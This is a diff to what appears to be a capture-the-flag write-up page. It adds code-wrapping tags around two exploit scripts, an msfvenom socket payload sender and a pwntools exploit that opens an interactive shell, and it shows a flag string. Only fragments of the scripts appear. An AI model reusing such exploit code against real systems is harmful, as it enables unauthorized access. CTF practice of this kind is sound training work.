@@ -30,6 +30,7 @@ layout:
 
 #### msfvenom_payload.py
 
+{% code overflow="wrap" %}
 ```py
 import socket
 
@@ -60,9 +61,11 @@ client.send(buf)
 print(client.recv(1024))
 client.close()
 ```
+{% endcode %}
 
 #### pwntools_exploit.py
 
+{% code overflow="wrap" %}
 ```py
 from pwn import *
 
@@ -116,5 +119,6 @@ io.sendlineafter(':', payload)
 # Got Shell?
 io.interactive()
 ```
+{% endcode %}
 
 Flag: `flag{2f20f16416a066ca5d4247a438403f21}`
